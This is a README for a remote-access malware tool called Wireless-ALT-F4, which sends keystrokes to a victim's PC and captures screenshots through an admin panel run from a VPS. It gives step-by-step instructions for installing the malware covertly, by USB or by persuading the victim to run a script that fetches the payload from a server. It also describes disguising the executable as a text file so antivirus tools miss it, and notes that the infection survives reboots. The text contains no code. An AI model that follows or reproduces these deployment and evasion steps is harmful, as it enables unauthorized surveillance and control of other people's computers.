# Wireless-ALT-F4
Wireless-ALT-F4 is exactly what its name suggests — a malware-type tool that allows us to send keyboard key events to a target computer without the victim even noticing.  
I named it Wireless-ALT-F4 because, initially, my idea was to create a tool that would remotely turn off a victim's PC using the Alt + F4 keyboard combination. However, I soon realized that adding more key combinations would make it even more fun and powerful.  
Now, the tool supports multiple key combinations, and in the future, I plan to embed a full virtual keyboard, allowing complete remote control of the target's keyboard.  
In addition to sending key events, the tool can also capture and retrieve the latest screenshot from the victim’s computer, giving the user a live view of what’s running on the target machine.  

> NOTE: If you are not familiar with this project or have not been invited to participate, this repository is not intended for your use.
It contains the files needed to install the malware on a victim’s PC.
The actual controller (admin panel) is accessible only to a limited group of authorized users.

# How it works ?
First, you need to manually install this tool on the victim’s PC or somehow convince the victim to execute the installer script and accept all the prompts by clicking "Yes" when asked.  
Once the script is executed, the tool will be installed on the victim’s machine.  
After installation, you need to access the web-based admin panel (which you should already be familiar with if you are reading these docs).  
On the admin panel, you will see a list of connected devices. From the menu, you can select a device and start exploiting its system.  

# Pros
* There is no issue if the victim restarts their PC — the connection will automatically recover once the system boots up.
* Admins do not need to install any setup manually. I (the Super Admin) have already configured everything on a VPS. Admins simply need access to the admin web page to manage the connected clients.
* The malware installer is available in two versions:
  * **USB Method (fast)** : Load the installer onto a USB drive, plug it into the victim’s PC, and execute the provided script. This will transfer and install the malware onto the victim's machine.
  * **Automated Installer (slow)** : Transfer and execute a single script on the victim’s PC. It will automatically download the malware from the server and complete the installation without requiring any additional manual actions.

# How to use ?
> STEP 1: Clone this repository.  

> STEP 2: You will find 3 files launch.ps1 & launch.ps2 & payload.txt.
> * payload.txt - Don't worry much about this file its actually malware's exe renamed as text file so that antivirus can not detect it.
> * launch.ps1 - Its used when you are using `USB Method` to use it first create a folder in your pendrive, then copy payload.txt and launch.ps1 into that folder, then go to victim's PC, plugin you pendrive and double-click launch.ps1 file, click yes to every prompt and in few time all done remove your pendrive.
> * launch.ps2 - Its used when you are using `Automated Installer` method, just somehow send this file into victim's PC and convence them or you yourself execute this file on there system then click all prompts yes and after script completes delete this script from there system and all done.

> STEP 3 : Go to admin panel, link will be known to you if you are part of the admins group and login to admin panel and start exploiting.
